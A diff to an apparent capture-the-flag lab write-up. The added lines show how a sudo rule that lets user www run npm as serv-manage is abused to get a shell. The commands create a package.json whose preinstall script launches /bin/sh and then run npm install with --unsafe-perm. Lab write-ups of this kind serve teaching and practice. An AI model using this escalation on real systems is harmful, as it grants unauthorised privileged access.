@@ -167,6 +167,12 @@ User www may run the following commands on ip-10-10-115-148:
     (serv-manage) NOPASSWD: /usr/bin/npm
 ```
 
-This means I can run npm as the serv-manage user. I'll create a script to generate a shell and run that shell as serv-manage.
+This means I can run npm as the serv-manage user. Npm needs a package.json file to work. I'll create a package.json file that will run a preinstall script to generate a shell and run that shell as serv-manage. I'll create the package.json file in `/tmp`.
+
+```bash
+$ cd /tmp
+$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > package.json
+$ sudo -u serv-manage /usr/bin/npm -C /tmp/ --unsafe-perm i
+```
 
 ## What is the user flag? (user.txt)
